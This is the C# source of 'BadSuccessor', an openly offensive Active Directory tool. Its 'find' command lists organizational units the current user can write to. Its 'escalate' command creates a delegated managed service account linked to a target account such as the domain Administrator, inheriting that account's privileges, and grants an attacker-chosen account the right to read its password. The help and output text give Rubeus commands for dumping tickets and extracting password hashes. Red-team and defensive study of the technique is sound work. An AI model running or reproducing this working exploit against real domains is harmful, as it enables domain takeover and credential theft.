using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Linq;

namespace BadSuccessor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.WriteLine(" ______           __ _______                                               ");
            Console.WriteLine("|   __ \\ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.");
            Console.WriteLine("|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|");
            Console.WriteLine("|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|  ");
            Console.WriteLine();
            Console.WriteLine("Researcher: @YuG0rd");
            Console.WriteLine("Author: @kreepsec");
            Console.WriteLine();

            if (args.Length == 0)
            {
                ShowHelp();
                return;
            }

            var verb = args[0].ToLowerInvariant();
            switch (verb)
            {
                case "find":
                    DoFind();
                    break;

                case "escalate":
                    DoEscalate(args);
                    break;

                default:
                    Console.Error.WriteLine("[x] Unknown command: " + args[0]);
                    ShowHelp();
                    break;
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine("  BadSuccessor find");
            Console.WriteLine("    Enumerate and list all Organizational Units you have write access to.");
            Console.WriteLine();
            Console.WriteLine("  BadSuccessor escalate -targetOU <OU=…,DC=…> -dmsa <name> -targetUser <full DN> [-dc-ip <host>] -dnshostname <hostname> (-machine <name$> | -user <username>)");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  BadSuccessor find");
            Console.WriteLine("  BadSuccessor escalate \\");
            Console.WriteLine("    -targetOU \"OU=Keep,DC=essos,DC=local\" \\");
            Console.WriteLine("    -dmsa kreep_dmsa \\");
            Console.WriteLine("    -targetUser \"CN=Administrator,CN=Users,DC=essos,DC=local\" \\");
            Console.WriteLine("    -dnshostname kreep_dmsa \\");
            Console.WriteLine("    -machine braavos$ \\");
            Console.WriteLine("    -dc-ip 192.168.10.15");
            Console.WriteLine();
            Console.WriteLine("  BadSuccessor escalate \\");
            Console.WriteLine("    -targetOU \"OU=Keep,DC=essos,DC=local\" \\");
            Console.WriteLine("    -dmsa kreep_dmsa \\");
            Console.WriteLine("    -targetUser \"CN=Administrator,CN=Users,DC=essos,DC=local\" \\");
            Console.WriteLine("    -dnshostname kreep_dmsa \\");
            Console.WriteLine("    -user john.doe \\");
            Console.WriteLine("    -dc-ip 192.168.10.15");
            Console.WriteLine();
            Console.WriteLine("Parameters:");
            Console.WriteLine("  -targetOU    DN of the OU container (e.g. OU=TestOU,DC=domain,DC=com)");
            Console.WriteLine("  -dmsa        Name for the new dMSA (sAMAccountName without '$')");
            Console.WriteLine("  -targetUser  Full DN of the existing service account (e.g. CN=SvcUser,CN=Users,DC=domain,DC=com)");
            Console.WriteLine("  -dnshostname dNSHostName to give to the new dMSA for Kerberos authentication");
            Console.WriteLine("  -machine     Machine account for msDS-GroupMSAMembership. Include the $, e.g: braavos$");
            Console.WriteLine("  -user        User account for msDS-GroupMSAMembership (sAMAccountName without domain)");
            Console.WriteLine("  -dc-ip       (Optional) FQDN or IP of the DC to bind against for schema-aware writes");
            Console.WriteLine();
            Console.WriteLine("Note: You must specify either -machine OR -user, but not both.");
            Console.WriteLine();
        }

        static void DoFind()
        {
            try
            {
                var principalSids = GetCurrentSids();
                var namingContext = GetDefaultNamingContext();
                var organizationalUnits = FindOrganizationalUnits(namingContext);

                Console.WriteLine();
                Console.WriteLine("[*] OUs you have write access to:");
                foreach (var ou in organizationalUnits)
                {
                    if (IsWritable(ou, principalSids, out List<string> privileges))
                    {
                        Console.WriteLine($"    -> {ou}");
                        Console.WriteLine($"       Privileges: {string.Join(", ", privileges)}");
                    }
                }
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[x] Error during find: " + ex.Message);
                Environment.Exit(1);
            }
        }

        static void DoEscalate(string[] args)
        {
            string targetOU = null!,
                   dmsaName = null!,
                   targetUserDn = null!,
                   dcIp = null!,
                   dnshostname = null,
                   machine = null,
                   user = null;

            for (int i = 1; i < args.Length; i++)
            {
                switch (args[i].ToLowerInvariant())
                {
                    case "-targetou" when i + 1 < args.Length: targetOU = args[++i]; break;
                    case "-dmsa" when i + 1 < args.Length: dmsaName = args[++i]; break;
                    case "-targetuser" when i + 1 < args.Length: targetUserDn = args[++i]; break;
                    case "-dc-ip" when i + 1 < args.Length: dcIp = args[++i]; break;
                    case "-dnshostname" when i + 1 < args.Length: dnshostname = args[++i]; break;
                    case "-machine" when i + 1 < args.Length: machine = args[++i]; break;
                    case "-user" when i + 1 < args.Length: user = args[++i]; break;

                    default:
                        Console.Error.WriteLine("[x] Unrecognized or incomplete flag: " + args[i]);
                        ShowHelp();
                        return;
                }
            }

            if (string.IsNullOrWhiteSpace(targetOU) ||
                !targetOU.StartsWith("OU=", StringComparison.OrdinalIgnoreCase) ||
                !targetOU.Contains("DC="))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Missing or invalid -targetOU.");
                return;
            }

            if (string.IsNullOrWhiteSpace(dmsaName))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Missing -dmsa.");
                return;
            }

            if (string.IsNullOrWhiteSpace(targetUserDn) ||
                !targetUserDn.Contains("CN=") ||
                !targetUserDn.Contains("DC="))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Missing or invalid -targetUser.");
                return;
            }

            if (string.IsNullOrWhiteSpace(dnshostname))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Missing -dnshostname.");
                return;
            }

            if (string.IsNullOrWhiteSpace(machine) && string.IsNullOrWhiteSpace(user))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Must specify either -machine or -user.");
                return;
            }

            if (!string.IsNullOrWhiteSpace(machine) && !string.IsNullOrWhiteSpace(user))
            {
                ShowHelp();
                Console.Error.WriteLine("[x] Cannot specify both -machine and -user. Choose one.");
                return;
            }

            try
            {
                CreateDmsaAccount(targetOU, dmsaName, targetUserDn, dcIp, dnshostname, machine, user);
                Console.WriteLine();
                Console.WriteLine("[+] Created dMSA '{0}' in '{1}', linked to '{2}' (DC: {3})",
                                  dmsaName, targetOU, targetUserDn, dcIp ?? "auto");
                Console.WriteLine();

                Console.WriteLine("[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash");
                Console.WriteLine("    -> Step 1: Find luid of krbtgt ticket");
                Console.WriteLine("     Rubeus:      .\\Rubeus.exe triage");
                Console.WriteLine("     Kerbeus BOF: krb_triage BOF");
                Console.WriteLine();
                Console.WriteLine("    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.");
                Console.WriteLine("     Rubeus:      .\\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap");
                Console.WriteLine("     Kerbeus BOF: krb_dump /luid:<luid>");
                Console.WriteLine();
                Console.WriteLine("    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 ) ");
                Console.WriteLine($"    Rubeus:      .\\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:{dmsaName}$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap");

            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[x] Failed to create dMSA: " + ex.Message);
                Environment.Exit(1);
            }
        }

        static HashSet<SecurityIdentifier> GetCurrentSids()
        {
            var sids = new HashSet<SecurityIdentifier>();
            var wi = WindowsIdentity.GetCurrent()
                       ?? throw new InvalidOperationException("Cannot get WindowsIdentity.");
            sids.Add((SecurityIdentifier)wi.User!);
            foreach (var group in wi.Groups!)
                if (group is SecurityIdentifier sid)
                    sids.Add(sid);
            return sids;
        }

        static string GetDefaultNamingContext(string dcIp = null)
        {
            var path = dcIp != null
                ? $"LDAP://{dcIp}/RootDSE"
                : "LDAP://RootDSE";
            using var root = new DirectoryEntry(path, null, null, AuthenticationTypes.Secure);
            return root.Properties["defaultNamingContext"].Value as string
                   ?? throw new InvalidOperationException("Cannot read defaultNamingContext.");
        }

        static List<string> FindOrganizationalUnits(string namingContext)
        {
            var ous = new List<string>();
            using var root = new DirectoryEntry($"LDAP://{namingContext}", null, null, AuthenticationTypes.Secure);
            using var ds = new DirectorySearcher(root)
            {
                Filter = "(objectCategory=organizationalUnit)",
                PageSize = 1000
            };
            ds.PropertiesToLoad.Add("distinguishedName");

            foreach (SearchResult res in ds.FindAll())
            {
                if (res.Properties["distinguishedName"].Count > 0)
                    ous.Add((string)res.Properties["distinguishedName"][0]);
            }
            return ous;
        }


        static bool IsWritable(string dn, HashSet<SecurityIdentifier> sids, out List<string> privileges)
        {
            var privilegeSet = new HashSet<string>();

            try
            {
                using var entry = new DirectoryEntry($"LDAP://{dn}", null, null, AuthenticationTypes.Secure);
                var rules = entry.ObjectSecurity
                                 .GetAccessRules(true, true, typeof(SecurityIdentifier));
                foreach (ActiveDirectoryAccessRule rule in rules)
                {
                    if (rule.AccessControlType != AccessControlType.Allow) continue;
                    if (!sids.Contains((SecurityIdentifier)rule.IdentityReference)) continue;

                    var rights = rule.ActiveDirectoryRights;

                    if ((rights & ActiveDirectoryRights.WriteProperty) != 0)
                        privilegeSet.Add("WriteProperty");
                    if ((rights & ActiveDirectoryRights.WriteDacl) != 0)
                        privilegeSet.Add("WriteDacl");
                    if ((rights & ActiveDirectoryRights.WriteOwner) != 0)
                        privilegeSet.Add("WriteOwner");
                    if ((rights & ActiveDirectoryRights.CreateChild) != 0)
                        privilegeSet.Add("CreateChild");
                    if ((rights & ActiveDirectoryRights.GenericWrite) != 0)
                        privilegeSet.Add("GenericWrite");
                    if ((rights & ActiveDirectoryRights.GenericAll) != 0)
                        privilegeSet.Add("GenericAll");
                }
            }
            catch { /* skip inaccessible OUs */ }

            privileges = privilegeSet.ToList();
            return privileges.Count > 0;
        }

        static void CreateDmsaAccount(string targetOu, string name, string precededByDn, string dcIp = null, string dnshostname = null, string machine = null, string user = null)
        {
            ;

            // Resolve naming context & current user DN
            var namingContext = GetDefaultNamingContext(dcIp);
            var sam = WindowsIdentity.GetCurrent().Name.Split('\\')[1];
            using var de = new DirectoryEntry(
                dcIp != null ? $"LDAP://{dcIp}/{namingContext}" : $"LDAP://{namingContext}",
                null, null, AuthenticationTypes.Secure);
            using var search = new DirectorySearcher(de)
            {
                Filter = $"(&(objectCategory=person)(sAMAccountName={sam}))",
                SearchScope = SearchScope.Subtree
            };
            search.PropertiesToLoad.Add("distinguishedName");
            var sr = search.FindOne() ?? throw new InvalidOperationException("Cannot find current user in AD.");
            var userDn = (string)sr.Properties["distinguishedName"][0]!;

            // Bind to the target OU
            var ouPath = dcIp != null
                ? $"LDAP://{dcIp}/{targetOu}"
                : $"LDAP://{targetOu}";
            using var ouEntry = new DirectoryEntry(ouPath, null, null, AuthenticationTypes.Secure);

            // Encryption Type flags
            const int DES_CBC_CRC = 0x04;
            const int DES_CBC_MD5 = 0x08;
            const int AES128_CTS = 0x10;

            Domain currentDomain = Domain.GetCurrentDomain();

            // PHASE 1: Create dMSA object
            Console.WriteLine("[*] Creating dMSA object...");
            var acct = ouEntry.Children.Add($"CN={name}", "msDS-DelegatedManagedServiceAccount");
            acct.Properties["msDS-DelegatedMSAState"].Value = 0;
            acct.Properties["msDS-ManagedPasswordInterval"].Value = 30;
            acct.Properties["dNSHostName"].Add(dnshostname + "." + currentDomain);
            acct.Properties["sAMAccountName"].Add(name + "$");

            // PHASE 2: Apply dMSA attributes
            Console.WriteLine("[*] Inheriting target user privileges");
            acct.Properties["msDS-ManagedAccountPrecededByLink"].Add(precededByDn);
            Console.WriteLine($"    -> msDS-ManagedAccountPrecededByLink = {precededByDn}");
            acct.Properties["msDS-DelegatedMSAState"].Value = 2;
            Console.WriteLine("    -> msDS-DelegatedMSAState = 2");
            Console.WriteLine("[+] Privileges Obtained.");

            // PHASE 3: Add machine or user account to PrincipalsAllowedToRetrieveManagedPassword property
            Console.WriteLine("[*] Setting PrincipalsAllowedToRetrieveManagedPassword");

            try
            {
                SecurityIdentifier targetSid;
                string targetAccountName;
                string searchFilter;

                if (!string.IsNullOrWhiteSpace(machine))
                {
                    // Machine account mode
                    targetAccountName = machine;
                    searchFilter = $"(&(objectCategory=computer)(sAMAccountName={machine}))";
                    Console.WriteLine($"    -> msDS-GroupMSAMembership = {machine}");
                }
                else
                {
                    // User account mode
                    targetAccountName = user;
                    searchFilter = $"(&(objectCategory=person)(sAMAccountName={user}))";
                    Console.WriteLine($"    -> msDS-GroupMSAMembership = {user}");
                }

                // Search for the target account
                using var searchSID = new DirectorySearcher(de)
                {
                    Filter = searchFilter,
                    SearchScope = SearchScope.Subtree
                };
                searchSID.PropertiesToLoad.Add("objectSid");

                var targetResult = searchSID.FindOne();
                if (targetResult == null)
                    throw new InvalidOperationException($"Cannot find account {targetAccountName}");

                byte[] sidBytes = (byte[])targetResult.Properties["objectSid"][0];
                targetSid = new SecurityIdentifier(sidBytes, 0);

                RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:S-1-5-32-544D:(A;;0xf01ff;;;" + targetSid.Value + ")");
                Byte[] descriptor = new byte[rsd.BinaryLength];
                rsd.GetBinaryForm(descriptor, 0);
                acct.Properties["msDS-GroupMSAMembership"].Add(descriptor);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error setting msDS-GroupMSAMembership: {ex.Message}");
            }

            Console.WriteLine("[+] Setting userAccountControl attribute");
            Console.WriteLine("[+] Setting msDS-SupportedEncryptionTypes attribute");
            acct.Properties["userAccountControl"].Value = 0x1000; // WORKSTATION_TRUST_ACCOUNT
            acct.Properties["msDS-SupportedEncryptionTypes"].Value = DES_CBC_CRC | DES_CBC_MD5 | AES128_CTS; // 0x1C

            acct.CommitChanges();
        }
    }
}
